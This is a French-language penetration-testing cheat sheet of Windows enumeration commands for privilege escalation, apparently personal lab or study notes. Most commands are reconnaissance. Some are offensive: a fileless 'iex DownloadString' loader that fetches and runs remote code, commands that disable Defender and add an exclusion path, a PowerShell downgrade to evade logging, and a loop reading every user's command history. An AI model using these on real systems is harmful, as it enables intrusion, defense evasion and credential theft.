

- [[#ENUMERATION AUTOMATIQUE]]
- [[#ENUMERATION MANUELLE]]

1. [ ] [[#1. PowerShell History]]
2. [ ] [[#2. Identifier les infos système]]
3. [ ] [[#3. Commandes PowerShell intéressantes]]
4. [ ] [[#4. Identifier les users / groupes]]
5. [ ] [[#5. Identifier les contrôles de sécurité]]
6. [ ] [[#6. Identifier la config réseau]]
7. [ ] [[#7. Identifier les processus / services lancés]]
8. [ ] [[#8. Identifier les programmes installés]]
9. [ ] [[#9. Identifier la politique de mots de passe]]
10. [ ] [[#10. Identifier les Named Pipes]]
11. [ ] [[#11. Identifier les services modifiables]]
12. [ ] [[#12. Identifier les Fichiers / Dossiers modifiables]]
13. [ ] [[#13. Identifier les clés de registre modifiables]]



---

# ENUMERATION AUTOMATIQUE

## WinPEAS

```
.\winPEASany.exe all > peas_scan
```



---

# ENUMERATION MANUELLE


# 1. PowerShell History

## Afficher l'historique de commandes PowerShell

1. Confirmer l'emplacement du fichier d'historique

```powershell
(Get-PSReadLineOption).HistorySavePath
```

2. Boucle foreach pour lire l'historique de chaque user

```powershell
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```


---

# 2. Identifier les infos système

## Récupère toutes les infos système suivantes

```cmd
systeminfo
```

## Identifier le hostname

```
hostname
```

## Afficher la version de l'OS

```powershell
[System.Environment]::OSVersion.Version
```

```cmd
ver
```

## Afficher les patchs installés

```powershell
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

## Afficher la config IP

```powershell
ipconfig /all
```

## Afficher les variables d'environnement (cmd)

```cmd
set
```

## Afficher le domain (cmd)

```cmd
echo %USERDOMAIN%
```

## Afficher le DC sur lequel le user est co (cmd)

```cmd
echo %logonserver%
```

## Voir les sessions

```powershell-session
qwinsta
```

```cmd
query user
```


---

# 3. Commandes PowerShell intéressantes

## Lister les modules

```
Get-Module
```

## Afficher la politique d'exécution des scripts

```
Get-ExecutionPolicy -List
```

## Changer la politique d'exécution des scripts

```
Set-ExecutionPolicy Bypass -Scope Process
```

## Afficher les variables d'environnement

```cmd
Get-ChildItem Env: | ft Key,Value
```

## Afficher l'historique de commandes PowerShell

1. Confirmer l'emplacement du fichier d'historique

```powershell
(Get-PSReadLineOption).HistorySavePath
```

2. Boucle foreach pour lire l'historique de chaque user

```powershell
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```


## Charger script en mémoire #Fileless

```
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"
```

## Downgrade version powershell (pas de logs dans event-viewr)


```powershell-session
powershell.exe -version 2
```


---

# 4. Identifier les users / groupes


## Identifier le user actuel

```
whoami
```

## Identifier les privilèges du user actuel

```
whoami /priv
```

[[3. Users Privileges]]

## Identifier les groupes auxquels appartient user actuel

```
whoami /groups
```

[[4. Groups Privileges]]

## Identifier tous les comptes utilisateur locaux

```cmd
net user
```

```powershell
Get-ChildItem -Recurse -Path C:\Users\
```

## Identifier tous les groupes locaux

```cmd
net localgroup
```

## Enumérer les membres d'un groupe

```cmd
net localgroup "Administrators"
```

```cmd
net localgroup "Backup Operators"
```

```cmd
net localgroup "Server Operators"
```

```cmd
net localgroup "Print Operators"
```

```cmd
net localgroup "DnsAdmin"
```

```cmd
net localgroup "Hyper-V Administrators"
```

```cmd
net localgroup "Remote Desktop Users"
```

```cmd
net localgroup "Remote Management Users"
```


---
# 5. Identifier les contrôles de sécurité


## Check du firewall

```powershell-session
netsh advfirewall show allprofiles
```

## Check si Defender tourne (cmd)

```cmd-session
sc query windefend
```

## Check de la conf de Defender (powershell)

```powershell-session
Get-MpComputerStatus
```

Désactiver si possible (https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/defense-evasion/disable-defender)

```
Set-MpPreference -DisableRealtimeMonitoring $true
```

Add path exclusion

```
Add-MpPreference -ExclusionPath "C:\temp"
```

## Check si AV Tiers installé (powershell)

```
Get-CimInstance -Namespace root/SecurityCenter2 -Classname AntiVirusProduct
```

## Check des règles Applocker

```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

## Test Applocker policy


```powershell
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```


---

# 6. Identifier la config réseau

## Table ARP

```
arp -a
```
## Cartes réseau et @IP

```
ipconfig /all
```
## Routes

```
route print
```
## Connexion actives

> [!TIP]
> Potentiel subnet in foreign adresses ?

```cmd
netstat -ano
```

## Ping Sweep

> [!ATTENTION]
> Relancer plusieurs fois

script cmd

```cmd
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

Script Powershell (lent) -> mieux vaut faire cmd /c 'for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"'

```powershell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```


---

# 7. Identifier les processus / services lancés

> [!TIP]
> Identifier les processus lancés en tant qu'administrateur ou autre user / service


```Powershell
Get-Process
```

```cmd
qprocess
```

```cmd
tasklist /svc
```

---
# 8. Identifier les programmes installés

> [!TIP]
> Chercher des CVEs

```
$MyProgs = Get-ItemProperty 'HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*'; $MyProgs += Get-ItemProperty 'HKLM:SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*'; $MyProgs | Select DisplayName,DisplayVersion
```


Ne récupère pas toujours tous les programmes

```cmd
wmic product get name
```

```powershell-session
Get-WmiObject -Class Win32_Product |  select Name, Version
```


---

# 9. Identifier la politique de mots de passe

```cmd
net accounts
```


---
# 10. Identifier les Named Pipes

```powershell-session
gci \\.\pipe\
```


---
# 11. Identifier les services modifiables


```
.\accesschk.exe /accepteula -uwcqv "<User>" *
```

```cmd-session
.\accesschk.exe /accepteula -quvcw WindscribeService
```

voir qui exécute le service

```
sc.exe qc "edgeupdate"
```

---
# 12. Identifier les Fichiers / Dossiers modifiables


Dossiers modifiables

```
.\accesschk.exe -accepteula -uwdqs "<User>" c:\
```


Fichiers modifiables

```
.\accesschk.exe -accepteula -uwqs "<User>" c:\*.*
```




---
# 13. Identifier les clés de registre modifiables


Check si COM Hijacking possible sur un programme.

```
.\accesschk.exe /accepteula -uwkqvs "<User>" HKLM\Software\Classes
```

```
reg query "HKLM\Software\Classes\...\InprocServer32"
```
